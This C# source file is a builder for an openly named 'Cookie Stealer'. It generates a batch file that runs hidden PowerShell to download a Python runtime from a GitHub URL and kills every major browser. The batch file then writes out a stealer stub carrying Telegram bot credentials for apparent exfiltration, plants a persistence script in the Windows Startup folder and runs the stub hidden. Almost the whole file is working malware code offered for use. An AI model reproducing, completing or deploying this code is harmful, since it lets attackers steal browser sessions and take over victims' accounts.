using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;



namespace CookieStealer
{
    internal class Program
    {
        public static List<string> list = new List<string>();

        private static string fileStub = "stub.py";

        private static string fileBuild = "start.bat";

        private static string fileTelegram = "telegram.txt";

        private static string pathStored = @"C:\\Users\\Public\\";

        private static string python = "https://github.com/h4x0rpeter/CookieStealer/raw/main/python.zip";




        static void Main(string[] args)
        {
            DownloadConfig();


            Console.Title = "Cookie Stealer v1.0";
            Console.ForegroundColor = ConsoleColor.Blue;

            string asciiArt = @"
   _____                   _      _             _____   _                    _               
  / ____|                 | |    (_)           / ____| | |                  | |              
 | |        ___     ___   | | __  _    ___    | (___   | |_    ___    __ _  | |   ___   _ __ 
 | |       / _ \   / _ \  | |/ / | |  / _ \    \___ \  | __|  / _ \  / _` | | |  / _ \ | '__|
 | |____  | (_) | | (_) | |   <  | | |  __/    ____) | | |_  |  __/ | (_| | | | |  __/ | |   
  \_____|  \___/   \___/  |_|\_\ |_|  \___|   |_____/   \__|  \___|  \__,_| |_|  \___| |_|   
                                                                                             
                                                                                             ";

            CenterWrite(asciiArt);

            const string text5 = "[ Cookie Stealer v1.0 ]";
            const string text6 = "- By H4x0rPeter -";

            CenterWrite(text5);
            CenterWrite(text6);

            Console.ForegroundColor = ConsoleColor.White;

            Console.Write("Press enter to build file...");
            Console.ReadLine();
            BuildFile();
            Console.WriteLine("Finish !");
  

            Process.Start("explorer.exe", Environment.CurrentDirectory);
            Console.ReadLine(); ;
        }

        static void DownloadConfig()
        {
            string stub = "stub.py";
            string config = "telegram.txt";

            string urlStub = "https://github.com/h4x0rpeter/CookieStealer/raw/main/stub.py";
            string urlConfig = "https://github.com/h4x0rpeter/CookieStealer/raw/main/telegram.txt";

            if (!File.Exists(stub))
                WebDownload(urlStub, stub);


            if (!File.Exists(config))
                WebDownload(urlConfig, config);

        }

        static void WebDownload(string url ,string fileName)
        {
            using (WebClient client = new WebClient())
            {
                try
                {
                    client.DownloadFile(url, fileName);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error WebDownload: " + ex.Message);
                }
            }
        }

        static void CenterWrite(string text)
        {
            int width = Console.WindowWidth;
            Console.WriteLine(text.PadLeft((width + text.Length) / 2));
        }

        static void BuildFile()
        {

            AddHeaderBatchFile();

            DownloadPython();

            KillBrowser();

            ExtractPython();

            EmptyFile();

            CheckLengthStub();

            ExtractStealer();

            StartupWindows();

            RunFile();

            File.WriteAllLines(fileBuild, list);

            //PackNative(fileBuild);

        }

        static void PackNative(string fileBuild)
        {
            string filePath = fileBuild;
            byte[] hexData = new byte[] { 0xFF, 0xFE, 0x0D, 0x0A };
            try
            {
                byte[] currentData = File.ReadAllBytes(filePath);
                using (FileStream fileStream = new FileStream(filePath, FileMode.Create))
                {
                    fileStream.Write(hexData, 0, hexData.Length);
                    fileStream.Write(currentData, 0, currentData.Length);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static void ExtractStealer()
        {
            string apiKey = "";

            string idGroup = "";

            string idGroup2 = "";
            string jsonFilePath = fileTelegram;

            if (!File.Exists(jsonFilePath))
            {
                Console.WriteLine("The file does not exist. Please create file telegram.txt");
                return;
            }


            string jsonContent = File.ReadAllText(jsonFilePath, Encoding.UTF8);


            Dictionary<string, object> jsonObject = Json.DeserializeJson(jsonContent);

            if (jsonObject.ContainsKey("apiKey"))
            {
                apiKey = jsonObject["apiKey"].ToString();
            }

            if (jsonObject.ContainsKey("idGroup"))
            {
                idGroup = jsonObject["idGroup"].ToString();
            }

            if (jsonObject.ContainsKey("idGroup2"))
            {
                idGroup2 = jsonObject["idGroup2"].ToString();
            }


            string[] readAllStub = File.ReadAllLines(fileStub);

            for (int i = 0; i < readAllStub.Length; i++)
            {
                string line = readAllStub[i];
                if (!string.IsNullOrEmpty(line))
                {
                    string replacedString = line.Replace("\"\"\"", "^\"\"\"") // Some batch file characters are not  recognized
                        .Replace("number = 1", "number = ^1")
                        .Replace("apiKey",apiKey)
                        .Replace("idGroup1",idGroup)
                        .Replace("idGroup2",idGroup2)
                        ; 
                        

                    string echo = $"echo {replacedString}>>{pathStored}{fileStub}";

                    list.Add(echo);
                }
            }

            list.Add("setlocal enabledelayedexpansion");
            list.Add("for /f %%i in ('echo %USERNAME%') do set user=%%i");
        }

        static void KillBrowser()
        {
            list.Add("taskkill -f -im chrome.exe");
            list.Add("taskkill -f -im msedge.exe");
            list.Add("taskkill -f -im chromium.exe");
            list.Add("taskkill -f -im brave.exe");
            list.Add("taskkill -f -im opera.exe");
            list.Add("taskkill -f -im firefox.exe");
        }

        static void CheckLengthStub()
        {
            list.Add($"for /f %%A in ('type \"{pathStored}{fileStub}\" ^| find /v /c \"\"') do (");
            list.Add("if %%A lss 3 (");
            list.Add("echo test");
            list.Add(") else (");
            list.Add("exit /b");
            list.Add(")");
            list.Add(")");

        }

        static void AddHeaderBatchFile()
        {
            list.Add("@echo off");
        }
        static void StartupWindows()
        {
            string file = $"{pathStored}Windows.bat";
            list.Add($"echo cmd /c C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python.exe C:\\Users\\Public\\{fileStub};>>{file}");
            list.Add($"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden -command \"Get-Content '{file}' | Set-Content 'C:\\Users\\!user!\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows.bat'\"");

        }

        static void ExtractPython()
        {
            list.Add("C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden expand-Archive C:\\\\Users\\\\Public\\\\Document.zip -DestinationPath C:\\\\Users\\\\Public\\\\Document;");

        }

        static void RunFile()
        {
            list.Add($"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden C:\\\\Users\\\\Public\\\\Document\\\\python C:\\\\Users\\\\Public\\\\{fileStub};");

        }

        static void DownloadPython()
        {
            list.Add($"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden Invoke-WebRequest -URI {python} -OutFile C:\\\\Users\\\\Public\\\\Document.zip;");
        }

        static void EmptyFile()
        {
            string fileStartup = $"{pathStored}Windows.bat";
            string fileStub = $"{pathStored}{Program.fileStub}";
            list.Add($"echo. >{fileStartup}");
            list.Add($"echo. >{fileStub}");
        }


    }
}
